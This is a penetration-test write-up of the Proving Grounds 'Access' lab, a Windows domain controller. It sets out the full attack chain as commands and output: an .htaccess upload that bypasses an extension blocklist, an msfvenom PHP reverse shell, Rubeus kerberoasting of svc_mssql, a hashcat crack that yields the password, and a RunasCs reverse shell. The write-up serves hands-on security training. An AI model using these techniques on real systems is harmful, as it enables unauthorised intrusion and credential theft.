---
machine: Access
platform: Proving Grounds
category: AD
os: Windows
difficulty: Insane
tags: [active-directory, file-upload, htaccess-bypass, kerberoasting, runascs]
date: 2026-07-14
status: retired
summary: A Windows Active Directory domain controller fronting a public-facing event site — testing web file-upload filter bypasses, Apache `.htaccess` abuse to smuggle an executable extension past a blocklist, and Kerberos service-account attacks (kerberoasting plus a credentialed run-as tool) to move from a low-privileged web account toward a domain service account.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[192.168.45.206]-[~/pg/access]
└─$ sudo nmap -p- -T4 192.168.163.187 -oN portscan
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-14 08:36 -0400
Nmap scan report for 192.168.163.187
Host is up (0.045s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49678/tcp open  unknown
49691/tcp open  unknown
49701/tcp open  unknown
49719/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 38.96 seconds
┌──(kali㉿kali)-[192.168.45.206]-[~/pg/access]
└─$ sudo nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,47001 -sCV -T4 192.168.163.187 -oN fingerprint
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-14 08:38 -0400
Nmap scan report for 192.168.163.187
Host is up (0.044s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-14 12:38:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-title: Access The Event
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-14T12:38:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.44 seconds
```

We see from our 3268 ldap fingerprint that our domain is called `access.offsec`

We can go ahead and add that to our `/etc/hosts`

We also have an apache webserver on port 80 running php: `Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7`

I feroxbust the webserver and find a few interesting directories:
- `http://access.offsec/uploads`
- `http://access.offsec/forms/contact.php`
- `http://access.offsec/Ticket.php`
- `http://access.offsec/forms/`
- `http://access.offsec/phpmyadmin` -> 403
- `http://access.offsec/webalizer` -> 403

On the main page we have Event Speakers, we will right down their names for possible spraying later:

```text
Brenden Legros
Hubert Hirthe
Cole Emmerich
Jack Christiansen
Alejandrin Littel
Willow Trantow
```

Theres a place to enter your email for a newsletter, this could be an exploitation vector but at first glance it seems more like a html template form.

There is also 4 fields we can input info in the Contact Us page that could possibly be an exploitation vector. We will keep this in mind and come back to them if we get stuck. When I send sample info the request seems to be formatted like so:

```http
------geckoformboundary90e53d7ebfdbde34189fd5af44ac1e75
Content-Disposition: form-data; name="name"

Name
------geckoformboundary90e53d7ebfdbde34189fd5af44ac1e75
Content-Disposition: form-data; name="email"

email@email.com
------geckoformboundary90e53d7ebfdbde34189fd5af44ac1e75
Content-Disposition: form-data; name="subject"

Subject
------geckoformboundary90e53d7ebfdbde34189fd5af44ac1e75
Content-Disposition: form-data; name="message"

Message <script>alert()</script>
------geckoformboundary90e53d7ebfdbde34189fd5af44ac1e75--
```

The POST response shows `Unable to load the "PHP Email Form" Library!` so this leads me to believe this is not the intended exploit vector, atleast as long as the PHP Email Form Library isn't properly loaded and will be unable to properly service POST requests.

The /uploads/ directory is empty. This could be useful later to execute files if we find a vector to upload files to the webserver.

The /forms/ directory has a file `contact.php` but when you click on it we get the same `Unable to load the "PHP Email Form" Library!`

When we go to Buy Tickets and click `Buy Now` on one of the tickets, it prompts us for our name, email, dropdown menu, and to upload an image. This could be a method to upload a rev/webshell and execute it in uploads.

## Foothold

I craft a php shell with msfvenom and attempt to upload it:

```bash
──(kali㉿kali)-[192.168.45.206]-[~/pg/access]
└─$ msfvenom -p php/reverse_php LHOST=192.168.45.206 LPORT=4444 -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2681 bytes
Saved as: shell.php
```

Upon uploading the shell.php, we get an alert from the page saying: "This file extension is not allowed !!"

We will try appending .jpg to the end.

This time it says "You will receive a payment link shortly" indicating that we bypassed the sanitization. If we go to /uploads/ we see our `shell.php.jpg` now listed.

The issue is that the webserver tries to execute it as a jpg and our php code is never executed.

### Bypassing Upload File Extension Sanitization with .htaccess

```text
### What `.htaccess` actually is

`.htaccess` ("hypertext access") is a **per-directory configuration file** that Apache reads and applies live, without needing a server restart. If Apache's config allows `AllowOverride All` (or similar) for that directory — which is common, especially in shared hosting or loosely configured setups — then **any file named `.htaccess` placed in a directory changes Apache's behavior for that directory**, for every subsequent request that hits it. Critically: it's not treated as "user content" by Apache — it's treated as a **configuration file**, even though it landed there via a file upload form meant for user data.
```

In order to exploit this we need:
- to be able to upload `.htaccess` successfully.
- Find a php based extension type that isnt explicitly in the blocklist (look for legacy extensions)
- Add the legacy type with .htaccess
- Submit the payload as the added legacy type.

I made an `.htaccess` file (this will change apache's behavior for the directory its uploaded to) and added type .php16 (you cannot usually explicitly override the .php block but rather add a new obscure nonblocked extension that will be handled by the php interpreter). I then successfully uploaded this `.htaccess` file. I then renamed my msfvenom php revshell to shell.php16 and successfully uploaded it.

```bash
┌──(kali㉿kali)-[192.168.45.206]-[~/pg/access]
└─$ cat .htaccess 
AddType application/x-httpd-php .php16
```

After opening my listener, I went to /uploads/ and executed shell.php16 and got a revshell back to my listener.

```bash
┌──(kali㉿kali)-[192.168.45.206]-[~/pg/access]
└─$ rlwrap -cAr nc -lvnp 4444                                                   
listening on [any] 4444 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.163.187] 65293
whoami
access\svc_apache
```

## Privilege Escalation

We find in the Users directory `svc_mssql` suggesting that mssql is running internally.

Out netstat -ano:

```bash
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2692
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       892
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       2692
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       892
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2228
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       540
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1040
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       60
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       632
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       1388
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       1740
  TCP    0.0.0.0:49691          0.0.0.0:0              LISTENING       2244
  TCP    0.0.0.0:49701          0.0.0.0:0              LISTENING       2288
  TCP    0.0.0.0:49719          0.0.0.0:0              LISTENING       624
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2244
  TCP    127.0.0.1:389          127.0.0.1:49675        ESTABLISHED     632
  TCP    127.0.0.1:389          127.0.0.1:49677        ESTABLISHED     632
  TCP    127.0.0.1:389          127.0.0.1:64735        ESTABLISHED     632
  TCP    127.0.0.1:389          127.0.0.1:64740        ESTABLISHED     632
  TCP    127.0.0.1:49675        127.0.0.1:389          ESTABLISHED     2200
  TCP    127.0.0.1:49677        127.0.0.1:389          ESTABLISHED     2200
  TCP    127.0.0.1:64735        127.0.0.1:389          ESTABLISHED     2244
  TCP    127.0.0.1:64740        127.0.0.1:389          ESTABLISHED     2244
  TCP    192.168.163.187:53     0.0.0.0:0              LISTENING       2244
  TCP    192.168.163.187:80     192.168.45.206:43262   ESTABLISHED     2692
  TCP    192.168.163.187:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.163.187:389    192.168.163.187:64824  ESTABLISHED     632
  TCP    192.168.163.187:389    192.168.163.187:64831  ESTABLISHED     632
  TCP    192.168.163.187:64824  192.168.163.187:389    ESTABLISHED     2288
  TCP    192.168.163.187:64831  192.168.163.187:389    ESTABLISHED     2288
  TCP    192.168.163.187:65312  192.168.45.206:4444    ESTABLISHED     4212
  TCP    192.168.163.187:65342  52.123.128.14:443      TIME_WAIT       0

```

We run winPEAS and find that svc_mssql has an SPN and will be vulnerable to kerberoasting. We don't have creds to svc_apache but we can transfer rubeus to the box and kerberoast from our revshell to auth to ldap and achieve kerberoasting svc_mssql.

### Kerberoasting svc_mssql

```powershell
PS C:\xampp\htdocs\uploads> .\rub2.exe kerberoast 
.\rub2.exe kerberoast 

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 12:33:45 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$7244017BD80883BB
                             5F4BBA9F7B52C3AC$8DBDC21548111799F2322C5B1C8C3C83A70CFFA7145686BE2A5681540485571
                             FA9E5C10603C3F722D45CB8F7458646680A97517DFA2A5023628664B9682AD287650713AE32704BA
                             723500DB9CD24EAC2F4329B0EC9A51133622CC3E634F052C17ED0BA9F371513D7BC3AE1A888704AC
                             FC3FF6155DBCE4C9668B4A0B13A64BA2667CE93F87132CE46E878AB3BA83F59A8412B810B309EF27
                             1019E50FF9410F5CC17CDDCDCD5CD88E10B4A7E5971594BB09E58760105E2734B2864F398651967F
                             24CFF16E2B0C4BE23D4D53C03652055BF3C5FE771E31B96ACAC1CD8C70EF98C8A0B7825A8540B58B
                             C9A69777B21A73DF279363F4F4735F232301FA0D549D5BDF5BB14DEE94D757B353C484E0FE9995DA
                             DE1EC0580BAA01108EF950586C507FD685C799310C75CC3030FE6F6903EC8D09B3511A773789F35C
                             A9AE2D0A41C9D25A86D9D04D222070C84139A71406C320F2EF43DEDB3D213962E327554046131769
                             1FA08C3AA6FD3ECF078331AEDC0244CEA8069CC11453516E69039DBC095EE854ABE90078624C627B
                             76C1628D7449EB2BA319CB766393995AC9FFBC3EAD3C90D3089420AC6E0AB2167264605E537F7B32
                             7DD63DACF39A981A6AC89C32E8C55354CEA977869238857A77464042E817725BD8F3D76F8BEF4851
                             BC562FCCCC3E098D72D32032547B34FF5BCFCD1D0A408A374959A2573C451FBA50F6373AA41256CE
                             B49BC3B1031C5C7ED63C6EAEC730536CA59C763A5AFD5CCDC0F4E46A3D9C02A692E9EB3849A5A5EA
                             713B91CD6922EA9A32C848A3C3361751F8ED46D4DC7D90DAA8D31326EAB56D088E0F214175A350F0
                             E650C6E1A74C1076624EC474D3B705F20B15EB84E9DCE4275D86D984B9D5F3EEDE3F4AE4134E9B06
                             5392D89D7069739969A50F323DC0AC131085C8C3E21469DAC784DA8B705D1B6E4DAE4CF094897067
                             C45E0176F170D9258E4269A0051703CF0B55B3CCFA066B5AFEE0A5046954B90828ABF7AAA3A5DA26
                             07E6749984E8F06FF7CEB57A1C97CB44D97DCA40A5991B6EF8CB301D6BC007BA94272F9766BFBFD4
                             129399C11C009815C3B019FC596E8097A3CB50EBB7055AA847BE95B798B3671156586D076E024CE9
                             AFD51649EF62128FFB5DC59E0BF620725491E727133FEABE14A948B92FB7D22F26807AD08BF71C17
                             87A006A9A1E8C1826AADA79DFBC76EBF498C295A82CA9C19CE72B2ED6C14430568BF17BE0B36A6A8
                             39747DD8C652CEE5CBCB566F2E0E88A08481295BDF6C19DF9975BD7F37B6EEEB519CDFFBA2AFD500
                             DBA0E683D29339274656B5C4A7AA31C4FC1C51317BEECD5CB3E014A439656F53E43CF99B76BA37C3
                             FB9E60E3716D5512163B0A7084D3811E874588B4599EF7DE9CE0A335EBAA45AE35916F156122CA05
                             FD9A12BFBF729A381AD449DC695B806DB5B4CDC913B2CB3F1503CFD99801CD1D015CB282D3F354CC
                             9C0276CFF336175A64508C41AD1F748183DF036C485CB6B1AC86BB0E623CDF046027504330B19917
                             432CE0E3C66D2F13F4B3EC0425E91F3A26DBAEABA6F971CED383310ECBAB89543E96333C629F3DC4
                             8FD5CDCFA3270F31ADCEFDF47E8FFD56F13EFB3D436CAB79A7513
```

We can crack this hash:

```bash
┌──(kali㉿kali)-[~/pg/access]
└─$ hashcat -m 13100 svchash.1 /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 ) - Platform #1 [Mesa/X.org]
===================================================
* Device #01: llvmpipe (LLVM 21.1.8, 256 bits), 7997/15995 MB (1023 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (12196 MB free)

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106869 bytes (47Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$7244017bd80883bb5f4bba9f7b52c3ac$8dbdc21548111799f2322c5b1c8c3c83a70cffa7145686be2a5681540485571fa9e5c10603c3f722d45cb8f7458646680a97517dfa2a5023628664b9682ad287650713ae32704ba723500db9cd24eac2f4329b0ec9a51133622cc3e634f052c17ed0ba9f371513d7bc3ae1a888704acfc3ff6155dbce4c9668b4a0b13a64ba2667ce93f87132ce46e878ab3ba83f59a8412b810b309ef271019e50ff9410f5cc17cddcdcd5cd88e10b4a7e5971594bb09e58760105e2734b2864f398651967f24cff16e2b0c4be23d4d53c03652055bf3c5fe771e31b96acac1cd8c70ef98c8a0b7825a8540b58bc9a69777b21a73df279363f4f4735f232301fa0d549d5bdf5bb14dee94d757b353c484e0fe9995dade1ec0580baa01108ef950586c507fd685c799310c75cc3030fe6f6903ec8d09b3511a773789f35ca9ae2d0a41c9d25a86d9d04d222070c84139a71406c320f2ef43dedb3d213962e3275540461317691fa08c3aa6fd3ecf078331aedc0244cea8069cc11453516e69039dbc095ee854abe90078624c627b76c1628d7449eb2ba319cb766393995ac9ffbc3ead3c90d3089420ac6e0ab2167264605e537f7b327dd63dacf39a981a6ac89c32e8c55354cea977869238857a77464042e817725bd8f3d76f8bef4851bc562fcccc3e098d72d32032547b34ff5bcfcd1d0a408a374959a2573c451fba50f6373aa41256ceb49bc3b1031c5c7ed63c6eaec730536ca59c763a5afd5ccdc0f4e46a3d9c02a692e9eb3849a5a5ea713b91cd6922ea9a32c848a3c3361751f8ed46d4dc7d90daa8d31326eab56d088e0f214175a350f0e650c6e1a74c1076624ec474d3b705f20b15eb84e9dce4275d86d984b9d5f3eede3f4ae4134e9b065392d89d7069739969a50f323dc0ac131085c8c3e21469dac784da8b705d1b6e4dae4cf094897067c45e0176f170d9258e4269a0051703cf0b55b3ccfa066b5afee0a5046954b90828abf7aaa3a5da2607e6749984e8f06ff7ceb57a1c97cb44d97dca40a5991b6ef8cb301d6bc007ba94272f9766bfbfd4129399c11c009815c3b019fc596e8097a3cb50ebb7055aa847be95b798b3671156586d076e024ce9afd51649ef62128ffb5dc59e0bf620725491e727133feabe14a948b92fb7d22f26807ad08bf71c1787a006a9a1e8c1826aada79dfbc76ebf498c295a82ca9c19ce72b2ed6c14430568bf17be0b36a6a839747dd8c652cee5cbcb566f2e0e88a08481295bdf6c19df9975bd7f37b6eeeb519cdffba2afd500dba0e683d29339274656b5c4a7aa31c4fc1c51317beecd5cb3e014a439656f53e43cf99b76ba37c3fb9e60e3716d5512163b0a7084d3811e874588b4599ef7de9ce0a335ebaa45ae35916f156122ca05fd9a12bfbf729a381ad449dc695b806db5b4cdc913b2cb3f1503cfd99801cd1d015cb282d3f354cc9c0276cff336175a64508c41ad1f748183df036c485cb6b1ac86bb0e623cdf046027504330b19917432ce0e3c66d2f13f4b3ec0425e91f3a26dbaeaba6f971ced383310ecbab89543e96333c629f3dc48fd5cdcfa3270f31adcefdf47e8ffd56f13efb3d436cab79a7513:trustno1
```

In order to get a shell as this user, we need to use [[RunasCs]] (A tool which uses a variety of different methods to gain a shell as a user given credentials based on different environments, which is exactly what we are aiming to do)

We can get the tool at this github: https://github.com/antonioCoco/RunasCs, copy the InvokeRunasCs.ps1 to the windows box

Run `Import-Module ./Invoke-RunasCs.ps1`

And from there we can use it to execute commands like call a revshell we generated in msfvenom:

`Invoke-RunasCs -Username "svc_mssql" -Password "trustno1" -Command "C:\xampp\htdocs\uploads\rev.exe"`

We now have a revshell as the user `svc_mssql`

```powershell
┌──(kali㉿kali)-[/usr/share/windows-resources/rubeus]
└─$ rlwrap -cAr nc -lvnp 9002                                                                           
listening on [any] 9002 ...
connect to [192.168.45.211] from (UNKNOWN) [192.168.125.187] 49556
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
access\svc_mssql

C:\Windows\system32>
```
